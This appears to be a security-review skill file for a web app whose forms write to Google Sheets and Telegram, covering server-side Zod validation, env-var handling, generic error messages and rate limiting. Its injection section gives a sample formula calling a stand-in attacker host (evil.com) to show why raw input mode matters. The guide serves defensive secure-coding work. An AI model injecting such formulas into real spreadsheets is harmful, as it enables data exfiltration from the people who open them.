---
name: security-review
description: Security review for server actions, form handling, and external integrations. Use before any release or when adding/modifying server actions, API calls, or user input handling.
---

# Security Review Best Practices

## Threat Model for This Project

The application accepts user input through three forms (booking, contact, feedback) and writes that data to:
1. Google Sheets (via service account credentials in env vars)
2. Telegram (via bot token in env vars)

The attack surface is: **user input → server action → external write**. Every step must be validated and sanitized.

## Server Action Security

### Always Validate on the Server

Client-side validation (react-hook-form + Zod in the browser) is UX, not security. Server actions are public HTTP endpoints — anyone can call them with arbitrary data via `curl`.

```ts
// Every server action must validate before doing anything
const result = schema.safeParse(Object.fromEntries(formData));
if (!result.success) {
  return { success: false, error: result.error.issues[0].message };
}
// Only use result.data from here — never the raw formData values
```

Never use `formData.get('field') as string` after validation and then pass it to an external system. Always use the typed `result.data` fields.

### Zod Schema Must Be Strict

Schemas must reject unexpected input:

```ts
// Bad — accepts any string of any length
name: z.string()

// Good — bounded, trimmed
name: z.string().min(2).max(100).trim()

// Bad — no format validation
contact: z.string().nonempty()

// Better — validate email or phone format
contact: z.string().email().or(z.string().regex(/^\+?[\d\s\-()]{7,20}$/))
```

For every field: set `min`, `max`, use `.trim()` on strings, validate format where applicable.

### Prevent Injection Into External Systems

**Google Sheets**: values written via the API are treated as user input by Sheets. Avoid formulas by ensuring all values use `valueInputOption: 'RAW'` unless you specifically need Sheets to parse the value. With `USER_ENTERED`, a value like `=IMPORTDATA("http://evil.com")` would execute.

```ts
// Safer default
valueInputOption: 'RAW',
```

**Telegram messages**: construct messages from validated `result.data` fields only. Never interpolate raw `formData.get()` values into the message string.

```ts
// Bad
const msg = `New booking: ${formData.get('name')} / ${formData.get('contact')}`;

// Good
const msg = `New booking: ${result.data.name} / ${result.data.contact}`;
```

## Environment Variables

Credentials must only live in environment variables — never committed to the repository:
- `GOOGLE_SHEETS_CLIENT_EMAIL`
- `GOOGLE_SHEETS_PRIVATE_KEY`
- `GOOGLE_SHEETS_SPREADSHEET_ID`
- Telegram bot token

**Validate at startup**: if a required env var is missing, the action should fail with a clear server-side error, not a cryptic runtime crash mid-request.

```ts
const spreadsheetId = process.env.GOOGLE_SHEETS_SPREADSHEET_ID;
if (!spreadsheetId) throw new Error('GOOGLE_SHEETS_SPREADSHEET_ID is not set');
```

**Private key handling**: `GOOGLE_SHEETS_PRIVATE_KEY` is stored with literal `\n` in env. Always unescape: `.replace(/\\n/g, '\n')`. Verify this is happening — a misconfigured key fails silently in some auth library versions.

## Error Handling

**Do not leak internals in error responses**:

```ts
// Bad — exposes stack trace or internal error to client
return { success: false, error: String(error) };

// Good — log internally, return generic message
console.error('Sheets write failed:', error);
return { success: false, error: 'Submission failed. Please try again.' };
```

Log errors server-side with enough context to debug (which action, which step), but never include credentials, raw user data, or stack traces in the client response.

## Rate Limiting

Currently there is no rate limiting on form submissions. Any of the three forms can be spammed to:
- Fill Google Sheets with junk data
- Flood the Telegram bot with messages

This should be addressed with either:
- Vercel's Edge middleware rate limiting (by IP)
- A simple in-memory counter per IP (acceptable for low-traffic sites)
- A CAPTCHA on the booking form specifically

Flag this as a known gap when reviewing any form-related code.

## What to Check in Every Review

- [ ] Server action validates all input with Zod before use
- [ ] Only `result.data` fields (not raw `formData`) are passed to external systems
- [ ] `valueInputOption: 'RAW'` for Google Sheets writes
- [ ] Error messages returned to client are generic, not internal
- [ ] Required env vars are checked before use
- [ ] No credentials, tokens, or private keys in source code or logs
- [ ] Telegram message built from validated data only
